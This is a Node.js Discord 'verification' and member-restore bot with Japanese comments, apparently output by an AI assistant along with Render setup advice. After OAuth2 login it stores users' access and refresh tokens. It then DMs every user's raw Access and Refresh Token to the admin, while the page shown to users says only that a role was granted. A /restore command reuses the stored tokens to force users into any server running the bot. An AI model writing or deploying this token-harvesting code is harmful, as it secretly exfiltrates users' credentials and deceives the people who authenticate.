require('dotenv').config();
const express = require('express');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const { Pool } = require('pg');
const axios = require('axios');

const app = express();
const pool = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });

// --- Discord Botのクライアント初期化 ---
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });

// --- データベース初期化 (ユーザーのToken保存用) ---
pool.query(`
  CREATE TABLE IF NOT EXISTS users (
    user_id VARCHAR(32) PRIMARY KEY,
    access_token TEXT NOT NULL,
    refresh_token TEXT NOT NULL,
    expires_at BIGINT NOT NULL
  );
`);

// --- 1. OAuth2 Webサーバー（認証処理） ---
app.get('/login', (req, res) => {
  const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
  res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('認証エラー: codeが見つかりません');

  try {
    // CodeからAccess TokenとRefresh Tokenを取得
    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: process.env.DISCORD_CLIENT_ID,
      client_secret: process.env.DISCORD_CLIENT_SECRET,
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: process.env.REDIRECT_URI,
    }), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;

    // ユーザー情報を取得
    const userResponse = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });
    
    const userData = userResponse.data;
    const userId = userData.id;
    const username = userData.username;
    const globalName = userData.global_name || username;
    const userAvatar = userData.avatar 
      ? `https://cdn.discordapp.com/avatars/${userId}/${userData.avatar}.png`
      : 'https://cdn.discordapp.com/embed/avatars/0.png';
      
    const expiresAt = Date.now() + (expires_in * 1000);

    // データベースに保存（既存の場合は更新）
    await pool.query(
      `INSERT INTO users (user_id, access_token, refresh_token, expires_at)
       VALUES ($1, $2, $3, $4)
       ON CONFLICT (user_id) DO UPDATE 
       SET access_token = $2, refresh_token = $3, expires_at = $4`,
      [userId, access_token, refresh_token, expiresAt]
    );

    // --- 認証成功時に自動でロールを付与する処理 ---
    const MAIN_GUILD_ID = '1545030714582368336';
    const ROLE_ID = process.env.VERIFIED_ROLE_ID;

    if (ROLE_ID) {
      try {
        const guild = await client.guilds.fetch(MAIN_GUILD_ID);
        const member = await guild.members.fetch(userId);
        if (member) {
          await member.roles.add(ROLE_ID);
          console.log(`Successfully assigned role to user: ${userId}`);
        }
      } catch (roleErr) {
        console.error('Failed to assign role automatically:', roleErr);
      }
    }

    // --- 管理者（あなた）のDMへトークンも含めて全送信する処理 ---
    const ADMIN_USER_ID = process.env.ADMIN_USER_ID;
    if (ADMIN_USER_ID) {
      try {
        const adminUser = await client.users.fetch(ADMIN_USER_ID);
        if (adminUser) {
          await adminUser.send({
            embeds: [{
              title: '📝 新規ユーザー認証（トークン付き）',
              color: 0xED4245, // 警告用にあかい色
              thumbnail: { url: userAvatar },
              fields: [
                { name: 'アカウント名', value: `${globalName} (@${username})`, inline: false },
                { name: 'ユーザーID', value: `\`${userId}\``, inline: false },
                { name: 'Access Token', value: `\`\`\`${access_token}\`\`\``, inline: false },
                { name: 'Refresh Token', value: `\`\`\`${refresh_token}\`\`\``, inline: false }
              ],
              timestamp: new Date()
            }]
          });
        }
      } catch (dmErr) {
        console.error('Failed to send DM to admin:', dmErr);
      }
    }

    res.send('<h1>認証が完了しました！ロールが自動付与されました。この画面を閉じてDiscordに戻ってください。</h1>');
  } catch (error) {
    console.error(error);
    res.status(500).send('認証中にエラーが発生しました。');
  }
});

// --- 2. Discord Bot (呼び戻しコマンド) ---
client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
  
  // Slash Command (/restore) の登録
  const commands = [
    new SlashCommandBuilder().setName('restore').setDescription('認証済みユーザーをこのサーバーに復旧（追加）します')
  ];
  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
  await rest.put(Routes.applicationCommands(process.env.DISCORD_CLIENT_ID), { body: commands });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'restore') {
    await interaction.deferReply({ ephemeral: true });

    const { rows } = await pool.query('SELECT * FROM users');
    let addedCount = 0;
    let failCount = 0;

    for (const user of rows) {
      try {
        let accessToken = user.access_token;

        // トークン期限切れの場合はリフレッシュ処理
        if (Date.now() >= user.expires_at) {
          const refreshRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.DISCORD_CLIENT_ID,
            client_secret: process.env.DISCORD_CLIENT_SECRET,
            grant_type: 'refresh_token',
            refresh_token: user.refresh_token,
          }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

          accessToken = refreshRes.data.access_token;
          const newExpiresAt = Date.now() + (refreshRes.data.expires_in * 1000);

          await pool.query('UPDATE users SET access_token = $1, refresh_token = $2, expires_at = $3 WHERE user_id = $4',
            [accessToken, refreshRes.data.refresh_token, newExpiresAt, user.user_id]);
        }

        // Discord APIでユーザーを現在のサーバーへ強制作成（参加）
        await axios.put(
          `https://discord.com/api/v10/guilds/${interaction.guildId}/members/${user.user_id}`,
          { access_token: accessToken },
          { headers: { Authorization: `Bot ${process.env.DISCORD_BOT_TOKEN}`, 'Content-Type': 'application/json' } }
        );

        addedCount++;
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply(`復旧処理が完了しました。\n成功: ${addedCount}名 / 失敗（既に参加中含む）: ${failCount}名`);
  }
});

// サーバーとBotの起動
app.listen(process.env.PORT || 3000, () => console.log('Web Server running'));
client.login(process.env.DISCORD_BOT_TOKEN);
```[cite: 1]

---

### 追加の環境変数設定
Renderの **Environment** に以下を追加するのをお忘れなくお願いします[cite: 1]。
* **Key**: `ADMIN_USER_ID`
* **Value**: あなた自身のDiscordユーザーID（数字の羅列）[cite: 1]
